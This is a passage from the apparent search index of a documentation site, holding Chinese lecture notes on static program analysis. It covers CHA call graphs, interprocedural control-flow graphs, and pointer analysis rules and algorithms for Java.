\u7684\u7ed3\u679c\u4ecd\u7136\u662f {A.foo(), C.foo(), D.foo()}\uff0c\u800c\u4e0d\u662f {A.foo()}\u3002\u867d\u7136\u8089\u773c\u4e00\u773c\u5c31\u770b\u51fa\uff0c\u4e0d\u53ef\u80fd\u8c03\u7528 C.foo() \u6216\u8005 D.foo()\uff0c\u56e0\u4e3a\u6211\u4eec\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61\u662f B\uff0c\u600e\u4e48\u53ef\u80fd\u8c03\u7528\u5b83\u5b50\u7c7b\u7684\u65b9\u6cd5\u5462\uff1f\u8fd9\u5c31\u662f CHA \u7684\u7f3a\u9677\uff01</p> <p>Intellij IDEA \u4e2d\u5c31\u662f\u91c7\u7528 CHA \u7b97\u6cd5\uff1a</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#cha-call-graph","title":"\u901a\u8fc7 CHA \u6784\u9020 Call Graph","text":"<p>\u4ece\u5165\u53e3\u65b9\u6cd5\uff08main\uff09\u5f00\u59cb\uff0c\u5bf9\u6bcf\u4e00\u4e2a\u53ef\u8fbe\u7684\u65b9\u6cd5 m \u4e2d\u7684\u6bcf\u4e00\u4e2a\u8c03\u7528\u70b9 cs\uff0c\u89e3\u6790\u76ee\u6807\u65b9\u6cd5\uff08Resolve(cs)\uff09\uff0c\u91cd\u590d\u8be5\u8fc7\u7a0b\u76f4\u5230\u6ca1\u6709\u65b0\u7684\u65b9\u6cd5\u88ab\u53d1\u73b0\u3002\u5177\u4f53\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <p></p> <ul> <li> <p>WL\uff1aWork list, containing the methods to be processed</p> </li> <li> <p>CG\uff1aCall graph, a set of call edges</p> </li> <li>RM\uff1a A set of reachable methods\uff0c\u907f\u514d\u91cd\u590d\u5206\u6790\u540c\u4e00\u4e2a\u65b9\u6cd5</li> </ul> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#icfginterprocedural-control-flow-graph","title":"\u8fc7\u7a0b\u95f4\u63a7\u5236\u6d41\u56fe\uff08ICFG,Interprocedural Control-Flow Graph\uff09","text":"<p>CFG \u8868\u5f81\u4e86\u5355\u4e2a\u65b9\u6cd5\u5185\u7684\u7ed3\u6784\uff0cICFG \u5219\u66f4\u5168\u9762\u7684\u8868\u8fbe\u4e86\u6574\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u7ed3\u6784\u3002</p> <p>ICFG \u56fe\u4e2d\u9664\u4e86 CFG \u7684\u4fe1\u606f\u5916\uff0c\u8fd8\u6dfb\u52a0\u4e86\u989d\u5916\u7684\u4e24\u7c7b edge\uff1a</p> <ul> <li>Call edges\uff1a\u4ece call-site \u6307\u5411 callee \u7684 entry node</li> <li>Return edges\uff1a\u4ece callee \u7684 exit node \u6307\u5411 call-site \u7684\u4e0b\u4e00\u4e2a\u8bed\u53e5</li> </ul> <p>\u57fa\u4e8e ICFG \u8fdb\u884c\u7a0b\u5e8f\u5206\u6790\uff0c\u5176 Transfer Function \u4e0d\u4ec5\u9700\u8981\u6b63\u5e38\u7684 Node Transfer \u8fd8\u8981\u5904\u7406 Call Edge Transfer\uff08\u7528\u4e8e\u4f20\u53c2\uff09 \u548c Return Edge Transfer\uff08\u7528\u4e8e\u4f20\u9012\u8fd4\u56de\u503c\uff09\u3002</p> <p>\u5728\u672c\u5730\u65b9\u6cd5\u7684 CFG \u4e2d\u7684 Node Transfer \u9700\u8981\u628a\u8c03\u7528\u70b9\u7684\u5de6\u503c\u53d8\u91cf kill \u6389\uff08Return Edge Transfer \u4f1a\u8986\u76d6\u8fd9\u4e9b\u53d8\u91cf\u7684\u503c\uff09\u3002</p> <p></p> <p>\u9ec4\u8272\u80cc\u666f\u7684 edge \u88ab\u79f0\u4e3a\uff1acall-to-return edges\uff0c\u4fdd\u7559\u8fd9\u6761\u8fb9\u53ef\u4ee5\u6709\u52a9\u4e8e\u63d0\u5347\u5206\u6790\u6548\u7387\uff0c\u5982\u679c\u6ca1\u6709\u8be5\u8fb9\u7684\u8bdd\uff0ca \u53d8\u91cf\u4e5f\u9700\u8981\u968f\u7740 cg \u4e00\u8d77\u5206\u6790\u3002</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#2","title":"\u2461 \u6307\u9488\u5206\u6790","text":"<p>\u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u9488\u5206\u6790\uff1f</p> <p>\u5728 CHA \u4e2d\uff0c\u66fe\u4e3e\u8fc7\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>B b = new B(); // B \u5177\u6709\u5b50\u7c7b C\u3001D\nb.foo();\n</code></pre> <p>CHA \u5728\u89e3\u6790 <code>b.foo()</code> \u65f6\u4f1a\u5f97\u5230\u6240\u6709 B \u7c7b\u578b\u53ca\u5176\u5b50\u7c7b\u7684\u7b7e\u540d\u4e3a <code>foo()</code> \u7684\u65b9\u6cd5\uff0c\u5176\u4e2d\u5b50\u7c7b\u7684 <code>foo()</code> \u65b9\u6cd5\u5747\u4e3a\u8bef\u62a5\uff0c\u56e0\u4e3a B \u7c7b\u578b\u662f\u7236\u7c7b\uff0c\u4e0d\u53ef\u80fd\u8c03\u7528\u5b50\u7c7b\u7684\u65b9\u6cd5\u3002</p> <p>\u4f7f\u7528\u6307\u9488\u5206\u6790\u5219\u53ef\u4ee5\u627e\u5230\u552f\u4e00\u7684\u4e00\u4e2a\u76ee\u6807\u65b9\u6cd5\uff0c\u63d0\u9ad8\u5206\u6790\u7684\u51c6\u786e\u6027\u3002</p> <p>\u6307\u9488\u5206\u6790\u7b80\u4ecb</p> <ul> <li>\u9759\u6001\u5206\u6790\u7684\u57fa\u77f3</li> <li>\u5e38\u7528\u4e8e\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff0c\u8ba1\u7b97\u4e00\u4e2a\u6307\u9488\uff08variable or field\uff09\u80fd\u591f\u6307\u5411\u54ea\u4e9b\u5bf9\u8c61</li> <li>\u6307\u9488\u5206\u6790\u53ef\u4ee5\u770b\u4f5c\u4e00\u79cd may analysis\uff0c\u8ba1\u7b97\u7ed3\u679c\u662f\u4e00\u4e2a over-approximation</li> </ul> <p>\u6982\u5ff5\u8fa8\u6790\uff1a\u6307\u9488\u5206\u6790 vs. \u522b\u540d\u5206\u6790</p> <ul> <li> <p>\u6307\u9488\u5206\u6790\u56de\u7b54\u7684\u95ee\u9898\uff1aWhich objects a pointer can point to ?</p> </li> <li> <p>\u522b\u540d\u5206\u6790\u56de\u7b54\u7684\u95ee\u9898\uff1aCan two pointers point to the same object ?</p> </li> </ul> <p>\u522b\u540d\u5206\u6790\u7684\u7ed3\u679c\u53ef\u7531\u6307\u9488\u5206\u6790\u7684\u7ed3\u679c\u63a8\u5230\u800c\u6765\u3002</p> <p></p> <p>\u5f71\u54cd\u6307\u9488\u5206\u6790\u7684\u8981\u7d20</p> <p>\u6307\u9488\u5206\u6790\u662f\u975e\u5e38\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u8bb8\u591a\u56e0\u7d20\u90fd\u4f1a\u5f71\u54cd\u5176 \u7cbe\u5ea6\u548c\u6548\u7387\uff0c\u6807\u7ea2\u7684\u662f\u672c\u8bfe\u7a0b\u5185\u5bb9\uff1a</p> <p></p> <p>1. \u5806\u62bd\u8c61</p> <p>\u4e3a\u4e86\u4fdd\u8bc1\u9759\u6001\u5206\u6790\u80fd\u591f\u7ec8\u6b62\uff0c\u5bf9\u5806\u5185\u5b58\u8fdb\u884c\u5efa\u6a21\uff0c\u628a \u52a8\u6001\u5206\u914d\u7684\u65e0\u9650\u7684\u5177\u4f53\u5bf9\u8c61 \u6784\u5efa\u6210 \u6709\u9650\u7684\u62bd\u8c61\u7684\u5bf9\u8c61</p> <pre><code>for(...){\n  A a = new A(); // \u6bcf\u6b21\u8fed\u4ee3\u65b0\u5efa\u5bf9\u8c61\n}\n</code></pre> <p></p> <p>\u5806\u62bd\u8c61\u662f\u4e00\u95e8\u5341\u5206\u590d\u6742\u7684\u5b66\u79d1\uff0c\u6709\u65e0\u6570\u7684\u7814\u7a76\u548c\u65b9\u6cd5\uff0c\u6839\u636e\u7efc\u8ff0\u5927\u6982\u53ef\u5206\u7c7b\u4e3a\uff1a</p> <p></p> <p>\u672c\u8bfe\u7a0b\u4e2d\uff0c\u4ec5\u4ecb\u7ecd\u6700\u5e38\u7528\u7684 Allocation sites \u5806\u62bd\u8c61\u65b9\u6cd5\uff1a</p> <ul> <li>\u6839\u636e\u5177\u4f53\u5bf9\u8c61\u7684 allocation site \u5bf9\u5176\u5efa\u6a21</li> <li>\u6bcf\u4e2a allocation site \u5206\u914d\u4e00\u4e2a\u62bd\u8c61\u5bf9\u8c61\uff0c\u5176\u4ee3\u8868\u6240\u6709\u5728\u6b64\u5904\u5206\u914d\u7684\u5177\u4f53\u5bf9\u8c61</li> </ul> <p></p> <p>\u5728\u4e0a\u56fe\u4e2d\uff0c\u7531\u4e8e\u5faa\u73af\u7684\u5b58\u5728\uff0c\u5728\u8fed\u4ee3\u8fc7\u7a0b\u4e2d\u4f1a\u521b\u5efa\u65e0\u6570\u7684\u5177\u4f53\u5bf9\u8c61\uff0c\u4f46\u7531\u4e8e\u5bf9\u8c61\u7684 allocation site \u6570\u91cf\u662f\u56fa\u5b9a\u7684\uff0c\u56e0\u6b64\u62bd\u8c61\u5bf9\u8c61\u7684\u6570\u91cf\u4e5f\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u672c\u4f8b\u4e2d\u4e3a 1 \u4e2a\u62bd\u8c61\u5bf9\u8c61\u3002</p> <p>2. \u4e0a\u4e0b\u6587\u654f\u611f</p> <ul> <li> <p>\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u5206\u6790\u4e2d\uff0c\u5bf9\u540c\u4e00\u4e2a\u65b9\u6cd5\u7684\u4e0d\u540c\u8c03\u7528\u8fdb\u884c\u533a\u5206\uff0c\u5bf9\u6bcf\u4e00\u4e2a\u4e0a\u4e0b\u6587\u90fd\u5206\u6790\u4e00\u6b21\u76ee\u6807\u65b9\u6cd5\uff0c\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u5206\u6790\u53ef\u4ee5\u6709\u6548\u7684\u63d0\u5347\u68c0\u6d4b\u7cbe\u5ea6\u3002</p> </li> <li> <p>\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\u7684\u5206\u6790\u4e2d\uff0c\u5bf9\u540c\u4e00\u4e2a\u65b9\u6cd5\u7684\u4e0d\u540c\u8c03\u7528\u505a\u6570\u636e\u6d41\u7684\u5408\u5e76\u5904\u7406\uff0c\u53ea\u5206\u6790\u4e00\u6b21\uff0c\u53ef\u80fd\u4e22\u5931\u7cbe\u5ea6\u3002</p> </li> </ul> <p></p> <p>3. \u6d41\u654f\u611f</p> <p>\u6d41\u654f\u611f\u7684\u5206\u6790\u662f\u5c0a\u91cd\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\u7684\uff0c\u7a0b\u5e8f\u4e2d\u6bcf\u4e2a\u4f4d\u7f6e\u90fd\u7ef4\u62a4\u4e86\u4e00\u4e2a\u5305\u542b\u6307\u5411\u5173\u7cfb\u7684 map</p> <p>\u6d41\u4e0d\u654f\u611f\u7684\u5206\u6790\u662f\u5ffd\u89c6\u63a7\u5236\u6d41\u7684\u987a\u5e8f\u7684\uff0c\u6574\u4e2a\u7a0b\u5e8f\u53ea\u7ef4\u62a4\u4e86\u4e00\u4e2a\u5305\u542b\u6307\u5411\u5173\u7cfb\u7684 map</p> <p></p> <p>4. \u5206\u6790\u57df</p> <p>\u5168\u7a0b\u5e8f\u5206\u6790\uff1a\u8ba1\u7b97\u7a0b\u5e8f\u4e2d\u6240\u6709\u6307\u9488\u7684\u4fe1\u606f\uff0c\u670d\u52a1\u6240\u6709\u53ef\u80fd\u7684\u5e94\u7528</p> <p>\u9700\u6c42\u9a71\u52a8\u5206\u6790\uff1a\u53ea\u8ba1\u7b97\u9700\u8981\u7528\u5230\u7684\u6307\u9488\u7684\u4fe1\u606f\uff0c\u670d\u52a1\u7279\u5b9a\u7684\u5e94\u7528</p> <p>\u6307\u9488\u5206\u6790\u5173\u6ce8\u7684\u8bed\u53e5\uff1f</p> <p>\u7a0b\u5e8f\u8bed\u8a00\u4e2d\u5b58\u5728\u5f88\u591a\u7c7b\u578b\u7684\u8bed\u53e5\uff1a</p> <pre><code>if else\nfor/while\nbreak/continue\n...\n</code></pre> <p>\u663e\u7136\uff0c\u4e0a\u8ff0\u7684\u8bed\u53e5\u5e76\u4e0d\u4f1a\u5f71\u54cd\u6307\u9488\u7684\u6307\u5411\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u5173\u6ce8\u53ea\u5173\u6ce8 Pointer-Affecting Statements</p> <p>JAVA \u4e2d\u7684 \u6307\u9488\uff1a</p> <ul> <li>\u672c\u5730\u53d8\u91cf\uff08local variable\uff09e.g. x</li> <li>\u9759\u6001\u5b57\u6bb5\uff08static field\uff09e.g. C.f</li> <li>\u5b9e\u4f8b\u5b57\u6bb5\uff08instance field\uff09e.g. x.f</li> <li>\u6570\u7ec4\u5143\u7d20\uff08array element\uff09e.g. array[i]</li> </ul> <p>\u5728\u6570\u7ec4\u5143\u7d20\u7684\u6307\u9488\u5206\u6790\u4e2d\uff0c\u5ffd\u7565\u6570\u7ec4\u4e0b\u6807\uff0c\u628a\u6574\u4e2a\u6570\u7ec4\u89c6\u4f5c\u4e00\u4e2a\u5355\u72ec\u7684 field\uff0c\u6b64\u65f6\u5bf9\u6570\u7ec4\u5143\u7d20\u7684\u5904\u7406\u5c31\u4e0e\u5b9e\u4f8b\u5b57\u6bb5\u5341\u5206\u76f8\u4f3c\u4e86\u3002</p> <p></p> <p>\u5904\u7406\u9759\u6001\u5b57\u6bb5\u7684\u65b9\u5f0f\u4e0e\u5904\u7406\u672c\u5730\u53d8\u91cf\u76f8\u4f3c\uff0c\u5904\u7406\u6570\u7ec4\u5143\u7d20\u7684\u65b9\u5f0f\u4e0e\u5904\u7406\u5b9e\u4f8b\u5b57\u6bb5\u76f8\u4f3c\uff0c\u56e0\u6b64\u5728\u672c\u8bfe\u7a0b\u4e2d\u4e3b\u8981\u5173\u6ce8\u672c\u5730\u53d8\u91cf\u548c\u5b9e\u4f8b\u5b57\u6bb5\u7684\u6559\u5b66\u3002</p> <p>JAVA \u4e2d\u7684 pointer-affecting statements\uff1a</p> <ul> <li>\u521b\u5efa New <code>x = new T()</code></li> <li>\u8d4b\u503c Assign <code>x = y</code></li> <li>\u5b58\u50a8 Store <code>x.f = y</code></li> <li>\u52a0\u8f7d Load <code>y = x.f</code></li> <li>\u8c03\u7528 Call <code>r = x.k(a, \u2026)</code></li> <li>Static call\uff1a <code>C.foo()</code></li> <li>Special call\uff1a<code>super.foo()/x.()/this.privateFoo()</code></li> <li>Virtual call\uff1a<code>x.foo()</code> \u2014\u2014\u91cd\u70b9\uff01</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_5","title":"\u6307\u9488\u5206\u6790\u7406\u8bba\u57fa\u7840","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_6","title":"\u6307\u9488\u5206\u6790\uff1a\u89c4\u5219","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e00\u4e0b\u76f8\u5173\u7684\u57df\uff08domain\uff09\u548c\u8bb0\u6cd5\uff1a</p> <p></p> <p>\u5176\u4e2d\uff0c\\(o_i\\) \u8868\u793a\u7b2c \\(i\\) \u884c\u65b0\u5efa\u7684\u5bf9\u8c61\uff0c\\(P(O)\\) \u8868\u793a \\(O\\) \u7684\u5e42\u96c6\uff0c\\(pt(p)\\) \u8868\u793a\u53d8\u91cf \\(p\\) \u7684\u6307\u5411\u7684\u5bf9\u8c61\u7684\u96c6\u5408\u3002</p> <p>\u7531\u4e8e\u65b9\u6cd5\u8c03\u7528\u8f83\u4e3a\u590d\u6742\uff0c\u9996\u5148\u5173\u6ce8\u524d\u56db\u4e2a\u8bed\u53e5\u7684\u89c4\u5219\uff1a</p> <p></p> <p>\u89c4\u5219\u90e8\u5206\uff0c\u6a2a\u7ebf\u4e0a\u65b9\u662f\u524d\u63d0\uff08premise\uff09\uff0c\u4e0b\u65b9\u662f\u7ed3\u8bba\uff08conclusion\uff09\u3002</p> <ul> <li>New\uff1a\u5bf9\u5e94\u7684\u89c4\u5219\u7684\u6a2a\u7ebf\u4e0a\u65b9\u662f\u7a7a\u7684\uff0c\u610f\u5473\u7740\u5f53\u5206\u6790\u5230 New \u8bed\u53e5\u65f6\uff0c\u65e0\u6761\u4ef6\u5f97\u51fa\u6a2a\u7ebf\u4e0b\u65b9\u7684\u7ed3\u8bba\uff0c\u4e5f\u5c31\u662f\u5c06 \\(o_i\\) \u65e0\u6761\u4ef6\u52a0\u5165\u6307\u5411\u96c6\u5408 \\(pt(x)\\) \u4e2d\uff0c\u5176\u542b\u4e49\u4e3a\u53d8\u91cf \\(x\\) \u6307\u5411\u5bf9\u8c61 \\(o_i\\)</li> <li>Assign\uff1a\u5f53\u9047\u5230\u8d4b\u503c\u8bed\u53e5\u65f6\uff0c\u9996\u5148\u9700\u8981\u6ee1\u8db3\u6a2a\u7ebf\u4e0a\u65b9\u7684\u524d\u63d0\uff0c\u4e5f\u5c31\u662f \\(y\\) \u53d8\u91cf\u6307\u5411\u67d0\u4e2a\u5bf9\u8c61\uff0c\u4f8b\u5982 \\(o_i\\)\u3002\u968f\u540e\u6267\u884c\u6a2a\u7ebf\u4e0b\u65b9\u7684\u89c4\u5219\uff0c\u7531\u4e8e\u5c06 \\(y\\) \u8d4b\u503c\u7ed9\u4e86 \\(x\\)\uff0c\u56e0\u6b64 \\(x\\) \u4e5f\u8981\u6307\u5411 \\(y\\) \u6307\u5411\u7684\u5bf9\u8c61\uff0c\u5373\u8ba9 \\(x\\) \u4e5f\u6307\u5411 \\(o_i\\)</li> <li>Store\uff1a\u4e2a\u4eba\u8ba4\u4e3a\u672c\u8d28\u4e0a\u4ecd\u7136\u662f\u8d4b\u503c\uff0c\u4f46\u8d4b\u503c\u7684\u5bf9\u8c61\u662f\u53d8\u91cf \\(x\\) \u6307\u5411\u7684\u5bf9\u8c61\uff08\\(e.g. o_i\\)\uff09\u7684\u57df \\(f\\)\uff0c\u5373 \\(o_i.f\\)\u3002</li> <li>Load\uff1a\u7c7b\u4f3c\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_7","title":"\u5982\u4f55\u5b9e\u73b0\u6307\u9488\u5206\u6790","text":"<p>\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u6307\u9488\u5206\u6790\u7684\u8fc7\u7a0b\uff0c\u5176\u5b9e\u662f\u5728\u6307\u9488\uff08variables &amp; fields\uff09\u4e4b\u95f4\u4f20\u64ad\uff08propagate\uff09\u6307\u5411\u4fe1\u606f\u3002</p> <p>\u6307\u9488\u5206\u6790\u5b9e\u73b0\u7684\u5173\u952e\u662f\uff0c\u5982\u679c \\(pt(x)\\) \u6539\u53d8\u4e86\uff0c\u5e94\u8be5\u5c06\u8fd9\u79cd\u6539\u53d8\u4f20\u64ad\u5230 \\(x\\) \u5173\u8054\u7684\u6307\u9488\u4e0a\u3002</p> <p>\u56fe\u7ed3\u6784\u5f88\u9002\u5408\u8fd9\u7c7b\u5206\u6790\uff0c\u6211\u4eec\u4f7f\u7528\u6307\u9488\u6d41\u56fe\uff08pointer flow graph\uff0c\u7b80\u79f0 PFG\uff09\u6765\u8868\u793a\u7a0b\u5e8f\u4e2d\u5bf9\u8c61\u662f\u5982\u4f55\u5728\u4e0d\u540c\u6307\u9488\u4e4b\u95f4\u201c\u6d41\u52a8\u201d\u7684\uff0c\\(pt(x)\\) \u9700\u8981\u88ab\u4f20\u64ad\u5230\u56fe\u4e2d \\(x\\) \u7684\u6240\u6709\u540e\u7ee7\u8282\u70b9\u4e0a\u3002</p> <p>PFG\uff1a</p> <ul> <li>\u8282\u70b9\u5c31\u662f\u6307\u9488\uff0c\u5373\u53d8\u91cf\u6216\u5bf9\u8c61\u7684\u57df\u3002\\(Pointer = V \u222a (O \u00d7 F)\\)</li> <li>\u8fb9\u3002\\(Pointer \u00d7 Pointer\\)\u3002\\(x\u2192y\\) \u7684\u8fb9\u8868\u793a\u6307\u9488 \\(x\\) \u6307\u5411\u7684\u5bf9\u8c61\u53ef\u80fd\uff08may\uff09\u4f1a\u6d41\u52a8\u5230\u6307\u9488 \\(y\\)\u3002</li> </ul> <p>PFG \u7684\u8fb9\u9700\u8981\u6839\u636e\u4e2d\u7684\u7a0b\u5e8f\u8bed\u53e5\u548c\u524d\u9762\u4ecb\u7ecd\u7684\u5904\u7406\u89c4\u5219\u6765\u6dfb\u52a0\uff1a</p> <p></p> <p>\u5982\u4e0b\u662f\u4e00\u4e2a\u6307\u9488\u5206\u6790\u7684\u4f8b\u5b50\uff1a</p> <p></p> <p>\u5728\u6784\u5efa\u5b8c PFG \u4e4b\u540e\uff0c\u5f00\u59cb\u8fdb\u884c\u4f20\u64ad\u6307\u9488\u6307\u5411\u4fe1\u606f\uff0c\u7531\u4e8e\u8bed\u53e5 <code>j: b = new T();</code>\uff0c\u6240\u4ee5 \\(pt(b) = \\{o_j\\}\\)\uff0c\u53c8\u7531\u4e8e PFG \u4e2d\u7684\u8fb9\u4ee3\u8868\u7740\u6307\u5411\u5bf9\u8c61\u7684\u6d41\u52a8\uff0c\u5373\u53d8\u91cf \\(b\\) \u6307\u5411\u7684\u5bf9\u8c61\uff0c\u4f1a\u6d41\u52a8\u5230\u53d8\u91cf \\(a\\)\uff0c\u56e0\u6b64\u53d8\u91cf \\(a\\) \u4e5f\u6709\u53ef\u80fd\u6307\u5411\u53d8\u91cf \\(\\{o_j\\}\\)\uff0c\u5373 \\(pt(a) = \\{o_j\\}\\)\u3002\u540c\u7406\uff0c\u5bf9\u8c61\u7684\u57df \\(o_i.f\\) \u548c\u53d8\u91cf \\(e\\) \u4e5f\u6709\u53ef\u80fd\u6307\u5411\u53d8\u91cf \\(\\{o_j\\}\\)\u3002</p> <p>\u5728\u4e0a\u8ff0\u7684\u4f8b\u5b50\u4e2d\uff0c\u6307\u9488\u5206\u6790\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u9996\u5148\u6784\u5efa PFG</li> <li>\u7136\u540e\u5728 PFG \u4e0a\u4f20\u64ad\u6307\u9488\u6307\u5411\u4fe1\u606f</li> </ul> <p>\u6211\u4eec\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6784\u5efa PFG\uff0c\u662f\u56e0\u4e3a\u9996\u5148\u5047\u8bbe\u4e86 \\(o_i \u2208 pt(c), o_i \u2208 pt(d)\\)\uff0c\u4f46\u5b9e\u9645\u4e0a\uff0c\u8be5\u6307\u5411\u4fe1\u606f\u5fc5\u987b\u57fa\u4e8e PFG \u624d\u80fd\u83b7\u53d6\u3002 \u5f53\u7136\uff0c\u5728\u4f20\u64ad\u6307\u5411\u4fe1\u606f\u65f6\uff0c\u53c8\u9700\u8981\u4f9d\u8d56 PFG\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u8ff0\u4e24\u4e2a\u6b65\u9aa4\u5448\u73b0\u4e92\u76f8\u4f9d\u8d56\u7684\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u7b80\u5355\u7684\u5148\u540e\u987a\u5e8f\u3002</p> <p></p> <p>\u5728\u6784\u5efa PFG \u7684\u8fc7\u7a0b\u4e2d\uff0c\\(o_i.f\\) \u8282\u70b9\u76f8\u5173\u4fe1\u606f\u7684\u6784\u5efa\u4f9d\u8d56\u4e8e\u6307\u9488\u7684\u6307\u5411\u4fe1\u606f\uff0c\u4f8b\u5982\u5728\u5206\u6790\u8bed\u53e5 \u2461 <code>c.f = a</code> \u65f6\uff0c\u6839\u636e\u89c4\u5219\uff0c\u9996\u5148\u8981\u77e5\u9053\u53d8\u91cf \\(c\\) \u6307\u5411\u7684\u5bf9\u8c61\u96c6\uff0c\u5373 \\(pt(c)\\)\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5728\u6307\u9488\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\uff0cPFG \u662f\u4f1a\u52a8\u6001\u66f4\u65b0\u7684\uff0c\u800c\u4e0d\u662f\u5148\u6784\u5efa PFG\uff0c\u518d\u8fdb\u884c\u6240\u8c13\u7684\u6307\u9488\u5206\u6790\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_8","title":"\u6307\u9488\u5206\u6790\u7b97\u6cd5","text":"<p>\u8be5\u7b97\u6cd5\u8f93\u5165\u4e3a\u8bed\u53e5\u96c6\u5408 \\(S\\)\uff0c\u7531\u4e8e\u662f \u6d41\u4e0d\u654f\u611f\u7b97\u6cd5\uff0c\u5728\u5206\u6790\u65f6\u5e76\u4e0d\u5173\u6ce8\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\u3002</p> <p>\u521d\u59cb\u5316\uff1aWL, Work List \u5de5\u4f5c\u5217\u8868\uff1bPFG\uff0cpointer flow graph\uff0c\u6307\u9488\u6d41\u56fe\u3002</p> <p>WL \u4e2d\u5305\u542b\u4e86\u5f85\u5904\u7406\u7684\u6307\u5411\u4fe1\u606f\uff0c\u5176\u4e2d\u6bcf\u4e00\u9879\u5747\u4e3a\u5f62\u5982\uff1a\\(&lt;n,pts&gt;\\) \u7684\u5bf9\uff0c\u542b\u4e49\u4e3a\u6307\u9488 \\(n\\) \u548c\u5bf9\u8c61\u96c6\u5408 \\(pts\\)\uff0c\u6211\u4eec\u9700\u8981\u5728\u540e\u7eed\u7684\u5904\u7406\u4e2d\uff0c\u5c06 \\(pts\\) \u4e2d\u7684\u5bf9\u8c61\u4f20\u64ad\u5230 \\(pt(n)\\) \u4e2d\u3002\u901a\u4fd7\u7684\u8bf4\uff0c\u5c31\u662f\u8ba9 \\(n\\) \u4e5f\u6307\u5411 \\(pts\\) \u4e2d\u7684\u5bf9\u8c61\u3002</p> <ul> <li> <p>\u9996\u5148\u5904\u7406\u521b\u5efa\u65b0\u5bf9\u8c61\u7684 New \u8bed\u53e5\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a New \u8bed\u53e5\uff0c\u5c06\u4f1a\u5728 PFG \u4e2d\u5bf9\u5e94\u4e00\u4e2a\u8282\u70b9\u3002\u6211\u4eec\u5c06 \\(&lt;x,\\{o_i\\}&gt;\\) \u52a0\u5165\u5230 WL \u4e2d\uff0c\u5728\u540e\u7eed\u7684\u5904\u7406\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u8ba9 \\(x\\) \u4e5f\u9700\u8981\u6307\u5411 \\(pts\\) \u4e2d\u7684\u5bf9\u8c61\uff0c\u5e76\u6cbf\u7740 PFG \u5c06 \\(pts\\) \u4e2d\u7684\u5bf9\u8c61\u96c6\u5408\u4f20\u64ad\u4e0b\u53bb\u3002</p> </li> <li> <p>\u63a5\u7740\u5904\u7406\u8d4b\u503c\u8bed\u53e5 Assign\uff0c\u5b83\u5c06\u76f4\u63a5\u5728 PFG \u4e2d\u7684\u8282\u70b9\u4e4b\u95f4\u6dfb\u52a0\u8fb9 \\(y \u2192 x\\)\uff0c\u5982\u679c \\(y\\) \u6307\u5411\u67d0\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48 \\(x\\) \u4e5f\u8981\u6307\u5411\u8be5\u5bf9\u8c61\u3002\u5728\u7b97\u6cd5\u7684\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u5c06 \\(&lt;x,pt(y)&gt;\\) \u52a0\u5165 WL \u66f4\u65b0 \\(x\\) \u7684\u6307\u5411\u7684\u5bf9\u8c61\u96c6\u5408\uff0c\u8ba9 \\(x\\) \u4e5f\u6307\u5411 \\(y\\) \u6307\u5411\u7684\u5bf9\u8c61\u3002\uff08AddEdge \u65b9\u6cd5\uff09\u3002</p> </li> <li> <p>\u5904\u7406\u5b8c New \u548c Assign \u8bed\u53e5\u540e\uff0c\u5df2\u7ecf\u5728 WL \u4e2d\u52a0\u5165\u4e86\u5f85\u5904\u7406\u7684\u6307\u5411\u4fe1\u606f\uff0c\u63a5\u4e0b\u6765\u7684\u7b97\u6cd5 \u57fa\u4e8e WL 